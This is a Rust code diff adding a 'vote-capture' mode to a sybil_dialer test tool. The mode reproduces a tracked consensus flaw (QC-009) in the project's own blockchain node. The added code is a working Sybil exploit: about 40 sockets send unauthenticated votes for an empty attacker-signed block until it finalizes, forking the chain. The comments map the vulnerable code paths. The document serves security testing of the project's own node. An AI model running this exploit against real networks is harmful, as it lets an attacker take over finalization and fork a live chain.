@@ -66,13 +66,52 @@
 //! it through (event_loop.rs:1687-1701 exempts an agent_version containing
 //! "unknown").
 //!
+//! MODE `vote-capture` (the QC-009 vector — Snowball vote capture / fork)
+//! -----------------------------------------------------------------------
+//! Reproduces QC-009 against the Stage-2 clamp binary. The clamp pins the rung
+//! at (3,2,1) — quorum 2, decision_threshold(beta) 1, sample k=3 — regardless of
+//! socket count (consensus_manager.rs `RungInput::derive`, handle_consensus_tick
+//! at event_loop.rs:4172). Vote intake is UNAUTHENTICATED: a `ConsensusResponse::
+//! Vote{ preference }` from ANY connected PeerId is counted via
+//! `record_peer_response` (event_loop.rs:2089 → consensus_manager.rs:725). This
+//! mode:
+//!   1. Opens N (~40) held sockets to ONE target; each enters the node's
+//!      `peer_ips` unconditionally (event_loop.rs:1630), and 40+2 < MAX_PEERS=50
+//!      so none are evicted.
+//!   2. Answers the node's OWN outbound `ConsensusRequest::BlockProposal`
+//!      (the proposer sends one to every peer, event_loop.rs:4104/4195) — which
+//!      arrives at each socket as an inbound request-response `Request`. From the
+//!      honest block in that proposal it learns the exact `(height, parent_hash,
+//!      timestamp)`, so the attacker block B it crafts is guaranteed tip-parented
+//!      at the height under active consensus (no fabricated parent, no future
+//!      height — unlike candidate-flood). B is EMPTY and signed by a FIXED
+//!      throwaway wallet, so B is byte-identical across every socket (ed25519 is
+//!      deterministic) and its producer address (`ATTACK_PRODUCER`) is stable.
+//!   3. Seeds B into the node so it is HELD as a candidate (the tally filters to
+//!      held, tip-parented candidates, consensus_manager.rs:794): each socket
+//!      replies to the proposal with `Vote{ preference = B.hash() }` AND re-sends
+//!      B back as its own `BlockProposal` (reaches `add_candidate`,
+//!      event_loop.rs:1984) plus a best-effort `BlockCandidate` gossip.
+//!   4. ~40 distinct-PeerId votes for B dominate the k=3 sample, so B reaches
+//!      quorum 2 and finalizes in one beta=1 round (snowball.rs:130-162). B is
+//!      then applied (apply_block_validated has no producer/leader gate and does
+//!      not verify state_root — state.rs:1272-1330): "Finalized and applied block
+//!      <B.hash()>" appears in the victim's log — a self-produced tip is
+//!      finalized, i.e. finalization capture / fork.
+//! The CRUX message the node turns into a counted vote is the
+//! `ConsensusResponse::Vote` we send as the RESPONSE to the node's
+//! `ConsensusRequest::BlockProposal`; it reaches the node as an
+//! `RrMessage::Response` and is counted at event_loop.rs:2089.
+//!
 //! This is TEST/ATTACK infrastructure for the formation harness only. It is
 //! built with `--features formation-test` into `target/formation` and is never
 //! part of a release.
 
+use std::collections::HashMap;
 use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
 
-use futures::StreamExt;
+use futures::{FutureExt, StreamExt};
+use libp2p::request_response::{Event as RrEvent, Message as RrMessage};
 use libp2p::swarm::SwarmEvent;
 use libp2p::{Multiaddr, PeerId};
 use rand::RngCore;
@@ -81,9 +120,9 @@ use commputer_core::block::{Block, BlockHash, BlockHeader, CURRENT_PROTOCOL_VERS
 use commputer_core::genesis::TESTNET_CHAIN_ID;
 use commputer_core::signing::sign_block;
 use commputer_core::wallet::Wallet;
-use commputer_network::consensus_protocol::ConsensusRequest;
+use commputer_network::consensus_protocol::{ConsensusRequest, ConsensusResponse};
 use commputer_network::topics;
-use commputer_network::transport::CommpNetwork;
+use commputer_network::transport::{CommpBehaviourEvent, CommpNetwork};
 
 /// Wire-compatible mirror of the node's `ConsensusMessage::BlockCandidate`.
 ///
@@ -106,9 +145,10 @@ struct Args {
     target: String,
     /// Victim RPC base URL, e.g. `http://127.0.0.1:19145`.
     target_rpc: String,
-    /// `candidate-flood` | `socket-flood` | `silent`.
+    /// `candidate-flood` | `socket-flood` | `vote-capture` | `silent`.
     mode: String,
-    /// Number of crafted candidates (candidate-flood) or sockets (socket-flood).
+    /// Number of crafted candidates (candidate-flood) or sockets
+    /// (socket-flood / vote-capture).
     count: usize,
     /// candidate-flood ingress: `gossip` (default) | `rr`.
     vector: String,
@@ -126,9 +166,13 @@ fn print_usage() {
          \n\
          USAGE:\n\
          \x20 sybil_dialer --target <multiaddr> --target-rpc <url> \\\n\
-         \x20              [--mode candidate-flood|socket-flood|silent] \\\n\
+         \x20              [--mode candidate-flood|socket-flood|vote-capture|silent] \\\n\
          \x20              [--count N] [--vector gossip|rr] \\\n\
          \x20              [--future-offset N] [--flood-height N] [--hold-secs N]\n\
+         \n\
+         vote-capture (QC-009): --count sockets (default 40), holds --hold-secs;\n\
+         \x20 each socket answers the node's BlockProposal with a Vote for a\n\
+         \x20 self-produced tip-parented empty block to finalize it (fork).\n\
          \n\
          DEFAULTS: --mode candidate-flood --count 64 --vector gossip \\\n\
          \x20        --future-offset 2 --hold-secs 60\n"
@@ -474,6 +518,300 @@ async fn run_socket_flood(args: &Args) -> i32 {
     0
 }
 
+// ==========================================================================
+// vote-capture (QC-009)
+// ==========================================================================
+
+/// A FIXED attacker wallet, reconstructed identically on every call and by
+/// every socket, so B is byte-identical across sockets and `ATTACK_PRODUCER`
+/// is stable and printable for the whole run.
+///
+/// Seed: the BIP39 mnemonic for 32 bytes of ZERO entropy (23×"abandon" + "art").
+/// `Wallet::from_secret_bytes` is private, but `from_seed_phrase` is public and
+/// deterministic, and a fixed valid mnemonic is the cleanest fixed keypair the
+/// public API allows.
+fn fixed_attacker_wallet() -> Wallet {
+    let mut words: Vec<&str> = vec!["abandon"; 23];
+    words.push("art");
+    let phrase = words.join(" ");
+    Wallet::from_seed_phrase(&phrase).expect("zero-entropy 24-word mnemonic is valid BIP39")
+}
+
+/// The node's `BlockHash` Display is `hex::encode(&hash.0[..8])` (block.rs:21),
+/// which is exactly what the apply log line prints
+/// ("Finalized and applied block <this> at height <h>", event_loop.rs:4433).
+/// The scenario greps for this 16-hex prefix to detect a CAPTURED block.
+fn short_hash(h: &BlockHash) -> String {
+    hex::encode(&h.0[..8])
+}
+
+/// Craft one EMPTY, validly-signed block at `height`, parented on the REAL tip
+/// (`parent`) with a fixed `timestamp`/`epoch` learned from the honest proposal.
+/// DETERMINISTIC: identical inputs + the fixed wallet ⇒ identical bytes/hash
+/// across every socket, so all sockets vote the SAME hash and their votes
+/// aggregate (rather than splitting across per-socket variants).
+fn craft_attack_block(
+    height: u64,
+    parent: BlockHash,
+    timestamp: u64,
+    epoch: u64,
+    wallet: &Wallet,
+) -> Block {
+    let mut block = Block {
+        header: BlockHeader {
+            protocol_version: CURRENT_PROTOCOL_VERSION,
+            height,
+            parent_hash: parent,
+            tx_root: [0u8; 32],
+            proof_root: [0u8; 32],
+            state_root: [0u8; 32],
+            timestamp,
+            producer: *wallet.address(),
+            epoch,
+            producer_public_key: vec![],
+            signature: vec![],
+            checkpoint_hash: None,
+            chain_id: TESTNET_CHAIN_ID.to_string(),
+        },
+        transactions: vec![],
+        proof_summaries: vec![],
+        compliance_summary: None,
+        epoch_summary: None,
+    };
+    block.header.tx_root = block.compute_tx_root();
+    block.header.proof_root = block.compute_proof_root();
+    // state_root left zero: apply does NOT verify it (F25, state.rs:1327).
+    sign_block(&mut block, wallet);
+    block
+}
+
+/// Per-socket handler for the vote-capture loop. Named `CommpBehaviourEvent`
+/// (auto-derived, re-exported from `commputer_network::transport`) so it can
+/// match the inbound consensus request-response messages the generic
+/// `handle_event` deliberately ignores.
+#[allow(clippy::too_many_arguments)]
+fn handle_vote_event(
+    net: &mut CommpNetwork,
+    ev: SwarmEvent<CommpBehaviourEvent>,
+    wallet: &Wallet,
+    memo: &mut HashMap<(u64, BlockHash), Block>,
+    seed_counts: &mut HashMap<u64, usize>,
+    seed_redundancy: usize,
+    connected: &mut usize,
+) {
+    match ev {
+        SwarmEvent::ConnectionEstablished { peer_id, .. } => {
+            *connected += 1;
+            // Force the target into the gossipsub mesh so the best-effort
+            // BlockCandidate seed can reach it regardless of mesh scoring.
+            net.swarm
+                .behaviour_mut()
+                .gossipsub
+                .add_explicit_peer(&peer_id);
+        }
+        SwarmEvent::Behaviour(CommpBehaviourEvent::Consensus(RrEvent::Message {
+            peer,
+            message,
+        })) => match message {
+            RrMessage::Request { request, channel, .. } => match request {
+                // The node (proposer) sends us its honest block for `height`.
+                // We learn the height + real parent + timestamp from it, craft
+                // our tip-parented empty B, VOTE for B on this channel, and seed
+                // B so the node holds it as a votable candidate.
+                ConsensusRequest::BlockProposal { block_bytes, height } => {
+                    let (parent, ts, epoch) =
+                        match serde_json::from_slice::<Block>(&block_bytes) {
+                            Ok(hb) => (
+                                hb.header.parent_hash,
+                                hb.header.timestamp,
+                                hb.header.epoch,
+                            ),
+                            Err(_) => {
+                                let _ = net.swarm.behaviour_mut().consensus.send_response(
+                                    channel,
+                                    ConsensusResponse::NotReady { height, tip: 0 },
+                                );
+                                return;
+                            }
+                        };
+                    let key = (height, parent);
+                    let (bhash, b_clone) = {
+                        let b = memo.entry(key).or_insert_with(|| {
+                            let blk = craft_attack_block(height, parent, ts, epoch, wallet);
+                            // STABLE, greppable: one line per distinct attack
+                            // block. `hash=` matches the node's apply-log Display.
+                            eprintln!(
+                                "ATTACK_BLOCK height={} hash={} parent={} producer={}",
+                                height,
+                                short_hash(&blk.hash()),
+                                short_hash(&parent),
+                                hex::encode(blk.header.producer.0)
+                            );
+                            blk
+                        });
+                        (b.hash(), b.clone())
+                    };
+                    // THE CRUX: this Vote reaches the node as an RrMessage::Response
+                    // and is counted by record_peer_response (event_loop.rs:2089).
+                    let _ = net.swarm.behaviour_mut().consensus.send_response(
+                        channel,
+                        ConsensusResponse::Vote {
+                            height,
+                            preference: bhash.0,
+                            accept: true,
+                        },
+                    );
+                    // Seed B (bounded redundancy) so the node HOLDS it: both the
+                    // request-response add_candidate path (event_loop.rs:1984) and
+                    // the gossip BlockCandidate path (event_loop.rs:2198).
+                    let c = seed_counts.entry(height).or_insert(0);
+                    if *c < seed_redundancy {
+                        let bytes = serde_json::to_vec(&b_clone).unwrap_or_default();
+                        let req = ConsensusRequest::BlockProposal {
+                            block_bytes: bytes,
+                            height,
+                        };
+                        let _ = net
+                            .swarm
+                            .behaviour_mut()
+                            .consensus
+                            .send_request(&peer, req);
+                        let gmsg = WireConsensusMessage::BlockCandidate { block: b_clone };
+                        if let Ok(json) = serde_json::to_vec(&gmsg) {
+                            let wire = commputer_network::compress(&json);
+                            let _ = net
+                                .swarm
+                                .behaviour_mut()
+                                .gossipsub
+                                .publish(topics::consensus_topic(), wire);
+                        }
+                        *c += 1;
+                    }
+                }
+                // Node asks a non-voter for a vote. Answer with B if we already
+                // hold one for this height; else NotReady (the node re-sends the
+                // full BlockProposal to non-voters, so this arm is rarely hit).
+                ConsensusRequest::VoteRequest { height, .. } => {
+                    let known = memo
+                        .iter()
+                        .find(|((h, _), _)| *h == height)
+                        .map(|(_, b)| b.hash());
+                    let resp = match known {
+                        Some(bh) => ConsensusResponse::Vote {
+                            height,
+                            preference: bh.0,
+                            accept: true,
+                        },
+                        None => ConsensusResponse::NotReady { height, tip: 0 },
+                    };
+                    let _ = net
+                        .swarm
+                        .behaviour_mut()
+                        .consensus
+                        .send_response(channel, resp);
+                }
+            },
+            // The node's reply to our own seed BlockProposal — irrelevant.
+            RrMessage::Response { .. } => {}
+        },
+        SwarmEvent::OutgoingConnectionError { error, .. } => {
+            eprintln!("[sybil] outgoing connection error: {error}");
+        }
+        _ => {}
+    }
+}
+
+/// The QC-009 vote-capture: hold N sockets, answer the node's BlockProposals
+/// with votes for a self-produced tip-parented empty block, and finalize it.
+async fn run_vote_capture(args: &Args) -> i32 {
+    let wallet = fixed_attacker_wallet();
+    let addr = *wallet.address();
+    // STABLE identifiers for the scenario. Printed to stdout AND stderr so they
+    // survive whichever stream the harness captures.
+    let hex_addr = hex::encode(addr.0);
+    let bytes_json = serde_json::to_string(&addr.0).unwrap_or_default();
+    println!("ATTACK_PRODUCER={hex_addr}");
+    println!("ATTACK_PRODUCER_DISPLAY={addr}");
+    println!("ATTACK_PRODUCER_BYTES={bytes_json}");
+    eprintln!("ATTACK_PRODUCER={hex_addr}");
+    eprintln!(
+        "[sybil] vote-capture: sockets={} hold={}s target={}",
+        args.count, args.hold_secs, args.target
+    );
+
+    let target: Multiaddr = match args.target.parse() {
+        Ok(a) => a,
+        Err(e) => {
+            eprintln!("[sybil] bad --target multiaddr {:?}: {e}", args.target);
+            return 2;
+        }
+    };
+
+    // Build and dial N sockets, each a distinct PeerId (distinct voter).
+    let mut socks: Vec<CommpNetwork> = Vec::new();
+    for i in 0..args.count {
+        match CommpNetwork::new_with_keypair_path(0, None, "unknown") {
+            Ok(mut n) => match n.dial(target.clone()) {
+                Ok(()) => socks.push(n),
+                Err(e) => eprintln!("[sybil] socket {i}: dial failed: {e}"),
+            },
+            Err(e) => eprintln!("[sybil] socket {i}: build failed: {e}"),
+        }
+    }
+    if socks.is_empty() {
+        eprintln!("[sybil] no sockets built — aborting");
+        return 2;
+    }
+    eprintln!("[sybil] {} sockets dialed; holding {}s", socks.len(), args.hold_secs);
+
+    let mut memo: HashMap<(u64, BlockHash), Block> = HashMap::new();
+    let mut seed_counts: HashMap<u64, usize> = HashMap::new();
+    const SEED_REDUNDANCY: usize = 3;
+    let mut connected = 0usize;
+
+    // Responsive multi-swarm driver: drain every socket's ready events each
+    // pass (a per-socket blocking timeout would poll 40 sockets too slowly to
+    // answer proposals inside the 500ms consensus tick). Sleep only when idle.
+    let end = Instant::now() + Duration::from_secs(args.hold_secs);
+    let mut last_report = Instant::now();
+    while Instant::now() < end {
+        let mut progressed = false;
+        for sock in socks.iter_mut() {
+            while let Some(ev) = sock.swarm.select_next_some().now_or_never() {
+                progressed = true;
+                handle_vote_event(
+                    sock,
+                    ev,
+                    &wallet,
+                    &mut memo,
+                    &mut seed_counts,
+                    SEED_REDUNDANCY,
+                    &mut connected,
+                );
+            }
+        }
+        if last_report.elapsed() >= Duration::from_secs(15) {
+            eprintln!(
+                "[sybil] vote-capture progress: connects={} distinct-attack-blocks={} heights-seeded={}",
+                connected,
+                memo.len(),
+                seed_counts.len()
+            );
+            last_report = Instant::now();
+        }
+        if !progressed {
+            tokio::time::sleep(Duration::from_millis(5)).await;
+        }
+    }
+    eprintln!(
+        "[sybil] vote-capture done: connects={} distinct-attack-blocks={} heights-seeded={}",
+        connected,
+        memo.len(),
+        seed_counts.len()
+    );
+    0
+}
+
 /// Control: connect once and idle.
 async fn run_silent(args: &Args) -> i32 {
     let mut net = match CommpNetwork::new_with_keypair_path(0, None, "unknown") {
@@ -510,6 +848,7 @@ async fn main() {
     let code = match args.mode.as_str() {
         "candidate-flood" => run_candidate_flood(&args).await,
         "socket-flood" => run_socket_flood(&args).await,
+        "vote-capture" => run_vote_capture(&args).await,
         "silent" => run_silent(&args).await,
         other => {
             eprintln!("[sybil] unknown --mode '{other}'");
